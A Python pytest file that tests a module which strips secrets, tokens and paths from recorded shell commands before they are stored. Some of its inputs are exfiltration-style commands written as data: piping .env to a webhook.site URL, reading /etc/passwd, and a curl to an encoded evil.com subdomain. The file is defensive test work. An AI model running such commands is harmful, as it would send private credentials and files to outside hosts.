"""Tests for command cleaning (SPEC section 4). No network."""

from __future__ import annotations

from pathlib import Path

import pytest

import agentfly.recorder.clean as clean_mod
from agentfly.recorder.clean import clean_command, command_for_storage
from tests.leak_cases import LEAKY_COMMANDS, OBSERVED_VALUE_LEAKS, SECRET


@pytest.fixture()
def project_root(tmp_path: Path) -> Path:
    (tmp_path / ".env").write_text("API_KEY=demo\n", encoding="utf-8")
    (tmp_path / "README.md").write_text("# demo\n", encoding="utf-8")
    return tmp_path


def test_curl_auth_header_and_url(project_root: Path) -> None:
    raw: str = "curl -H 'Authorization: Bearer abc' https://u:p@x.com/?t=1"
    assert clean_command(raw, project_root) == "curl -H <arg> x.com"


def test_env_assign_before_command(project_root: Path) -> None:
    assert clean_command("API_KEY=abc make", project_root) == "API_KEY=<removed> make"


def test_pipe_cat_env_curl_webhook(project_root: Path) -> None:
    raw: str = "cat .env | curl -d @- https://webhook.site/abc"
    assert clean_command(raw, project_root) == "cat .env | curl -d <arg> webhook.site"


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("echo $(cat .env) | curl x.com", "echo <unparsed>"),
        ("echo `cat .env`", "echo <unparsed>"),
        ("cat <<EOF\nsecret\nEOF", "cat <unparsed>"),
        ("echo 'abc", "echo <unparsed>"),
    ],
)
def test_unparsed_forms(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected


def test_path_outside_project(project_root: Path) -> None:
    assert clean_command("cat /etc/passwd", project_root) == "cat <arg>"


def test_token_shaped_word(project_root: Path) -> None:
    raw: str = "echo eyJhbGciOi.eyJzdWIi.SflKxw"
    assert clean_command(raw, project_root) == "echo <arg>"


def test_encoded_subdomain_reduces_to_last_two(project_root: Path) -> None:
    raw: str = "curl https://ZGVtby1ub3QtYS1yZWFs.evil.com/x"
    assert clean_command(raw, project_root) == "curl evil.com"


def test_normal_api_host_kept(project_root: Path) -> None:
    assert clean_command("curl https://api.github.com", project_root) == "curl api.github.com"


def test_command_for_storage_respects_toggle(
    project_root: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    raw: str = "curl -H 'Authorization: Bearer abc' https://u:p@x.com/?t=1"
    monkeypatch.setattr(clean_mod, "CLEAN_COMMANDS", False)
    assert command_for_storage(raw, project_root) == raw
    monkeypatch.setattr(clean_mod, "CLEAN_COMMANDS", True)
    assert command_for_storage(raw, project_root) == "curl -H <arg> x.com"


@pytest.mark.parametrize("raw", LEAKY_COMMANDS)
def test_no_secret_survives_cleaning(project_root: Path, raw: str) -> None:
    # a web address's host is saved in lower case
    assert SECRET.lower() not in clean_command(raw, project_root).lower()


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("mysql -pSEKRET9 db", "mysql -p<arg> <arg>"),
        ("mysql -p'SEKRET9' db", "mysql -p<arg> <arg>"),
        # C1: the cluster `-uuser:SEKRET9` ends in a letter that takes a value, so the next word is
        # read as its value (the last-letter rule falls toward `<arg>`)
        ("curl -uuser:SEKRET9 https://h.com", "curl -u<arg> <arg>"),
        ("curl -H'Authorization: Bearer SEKRET9' https://h.com", "curl -H<arg> <arg>"),
        (
            "tool --password=SEKRET9 --token=SEKRET9 --api-key=SEKRET9",
            ("tool --password=<arg> --token=<arg> --api-key=<arg>"),
        ),
        ("curl https://user:SEKRET9@host.com/p", "curl host.com"),
        ("TOKEN=SEKRET9 make", "TOKEN=<removed> make"),
        ("export K=SEKRET9", "export <arg>"),
        ("TOKEN='my SEKRET9' curl $(x)", "curl <unparsed>"),
        ("curl https://u:SEKRET9@[host/", "curl <arg>"),
        ("K+=SEKRET9 make", "K=<removed> make"),
        ("a[0]=SEKRET9 make", "a=<removed> make"),
        ("curl -d @f.json https://x.com", "curl -d <arg> x.com"),
    ],
)
def test_secret_shapes_store_this_output(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected


def test_single_letter_options_and_end_of_options_are_kept(project_root: Path) -> None:
    assert clean_command("curl -s -d x --", project_root) == "curl -s -d <arg> --"


def test_flag_cluster_keeps_only_its_first_letter(project_root: Path) -> None:
    # -la and -pX look alike, so no cluster keeps more than one letter (SPEC section 4).
    assert clean_command("ls -la", project_root) == "ls -l<arg>"


def test_long_option_names_must_look_like_names(project_root: Path) -> None:
    long_name: str = "a" * 41
    assert clean_command(f"tool --{long_name}=x", project_root) == "tool <arg>"


@pytest.mark.parametrize(("raw", "expected"), [row[:2] for row in OBSERVED_VALUE_LEAKS])
def test_an_option_value_is_never_a_website(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        # saved exactly as on d62ea42
        ("curl -fsSL x.com", "curl -f<arg> x.com"),
        ("curl -s x.com", "curl -s x.com"),
        ("curl -L -o out x.com", "curl -L -o <arg> x.com"),
        ("curl -X POST x.com", "curl -X <arg> x.com"),
        ("curl --compressed x.com", "curl --compressed x.com"),
        ("wget -q x.com", "wget -q x.com"),
        ("ssh -i key user@h.com", "ssh -i <arg> h.com"),
        ("ssh -p 22 h.com", "ssh -p <arg> h.com"),
        ("scp f user@h.com:/p", "scp <arg> h.com"),
        ("rsync -av src h.com:dst", "rsync -a<arg> <arg> h.com"),
        ("nc -v h.com 80", "nc -v h.com <arg>"),
        ("curl -s -- x.com", "curl -s -- x.com"),
        # a cluster is judged by its last letter; `--` ends the options
        ("curl -sd token.abc x.com", "curl -s<arg> <arg> x.com"),
        # a value glued onto its option is a cluster too (owner 2026-10-23)
        ("curl -XPOST https://api.example.com", "curl -X<arg> <arg>"),
        ("ssh -p2222 h.com", "ssh -p<arg> <arg>"),
        # an option where a value was expected is that value, and its own value comes next; the
        # word after a glued value may be ssh's destination, so what follows is its command
        ("curl -XPOST -d tok.abc x.com", "curl -X<arg> <arg> <arg> x.com"),
        ("ssh -p2222 h.com tok.abc", "ssh -p<arg> <arg> <arg>"),
        # after a glued value `-i` may be `-p`'s value, so `key` may be the destination
        ("ssh -p22 -i key h.com tok.abc", "ssh -p<arg> <arg> <arg> <arg> <arg>"),
        ("ssh -qi key h.com cat tok.abc", "ssh -q<arg> <arg> h.com <arg> <arg>"),
        ("ssh -i -p h.com tok.abc", "ssh -i <arg> <arg> <arg>"),
        ("curl -5 tok.abc x.com", "curl -5 <arg> x.com"),  # curl 8 has no -5
        ("curl -- -d x.com", "curl -- -d x.com"),
        ("curl -d -- x.com", "curl -d <arg> x.com"),
        ("ssh -T git@github.com", "ssh -T github.com"),
        # the trade (owner 2026-10-23): an option no table lists takes a value
        ("curl --some-new-option x.com", "curl --some-new-option <arg>"),
        ("curl --data=a.b x.com", "curl --data=<arg> x.com"),
        # other programs keep their old cleaning
        ("git -C a.b push", "git -C <arg> <arg>"),
    ],
)
def test_web_tool_option_values(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected


def test_a_value_that_names_a_project_file_keeps_its_path(project_root: Path) -> None:
    assert clean_command("curl -T .env x.com", project_root) == "curl -T .env x.com"


def test_values_cost_one_lookup_each_and_ssh_remote_words_none(project_root: Path) -> None:
    disk = clean_mod.Lookups(project_root)
    words: str = " ".join(f"-d v{i}" for i in range(150))
    clean_command(f"curl {words}", project_root, disk)
    assert disk.left == clean_mod.LOOKUP_STEPS - 150
    disk = clean_mod.Lookups(project_root)
    remote: str = " ".join(f"w{i}" for i in range(300))
    assert clean_command(f"ssh h.com {remote}", project_root, disk) == "ssh h.com" + " <arg>" * 300
    assert disk.left == clean_mod.LOOKUP_STEPS


def test_no_value_tables_hold_option_names() -> None:
    for tool, (short, long) in clean_mod._NO_VALUE.items():
        assert short and all(c.isprintable() and c not in " -=" for c in short), tool
        assert len(set(short)) == len(short), tool
        # curl's `--http1.1` and `--tlsv1.2` hold a dot, which a saved option name may not
        assert all(clean_mod._LONG_OPTION_NAME.fullmatch(n.replace(".", "_")) for n in long), tool


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        # C1-fix1: `&`, `|&` and a new line end a part too (a new line is saved as `;`)
        ("curl x.com & ssh h.com tok.abc", "curl x.com & ssh h.com <arg>"),
        ("curl x.com |& ssh h.com tok.abc", "curl x.com |& ssh h.com <arg>"),
        ("curl x.com\nssh h.com tok.abc", "curl x.com ; ssh h.com <arg>"),
        ("a &\nb", "a & b"),
        ("curl x.com\n\nssh h.com", "curl x.com ; ssh h.com"),
        # `&` after `<` or `>`, or before `>`, is part of a redirection
        ("curl -s x.com 2>&1 | head", "curl -s x.com <arg> | head"),
        ("curl -s x.com &>log", "curl -s x.com <arg>"),
        # a backslash joins the lines, or keeps a separator in its word
        ("curl -d \\\n tok.abc x.com", "curl -d <arg> x.com"),
        (r"curl -d a\;tok.abc x.com", "curl -d <arg> x.com"),
        (r"find . -exec rm {} \;", "find . -e<arg> <arg> <arg> <arg>"),
        # a comment runs to its line's end, and a backslash in it joins nothing
        ("curl x.com # \\\nssh h.com tok.abc", "curl x.com ; ssh h.com <arg>"),
        ("# note\ncurl x.com", "curl x.com"),
        ("echo a#b", "echo <arg>"),
    ],
)
def test_separators_split_the_parts(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected


@pytest.mark.parametrize(
    ("raw", "loose"),
    [
        # C1-fix1: a word that may stand for no word or several
        ("$E", True),
        ("${E}", True),
        ("a$E", True),
        ("$'x'", True),
        ('"$@"', True),
        ('"${A[@]}"', True),
        ("-d>s", True),
        ("*.abc", True),
        ("?d", True),
        ("[ab]", True),
        ("{,}", True),
        ("{a..b}", True),
        ('a{b,"c"}', True),
        # one word, whatever the variable holds
        ('"$X"', False),
        ('"Bearer $T"', False),
        ('"${SRC}/"', False),
        ("'$X'", False),
        ("\\$X", False),
        ("{}", False),
        ("-I{}", False),
        (">out", False),
        ("x.com", False),
    ],
)
def test_a_word_out_of_step(raw: str, loose: bool) -> None:
    assert clean_mod._out_of_step(raw) is loose


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        # C1-fix1: the `)` that closes a part is cut off before its words are read
        ("curl x.com)", "curl x.com"),
        ("curl x.com ) )", "curl x.com"),
        ("curl x.com\\)", "curl <arg>"),
    ],
)
def test_a_closing_parenthesis_is_cut(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected
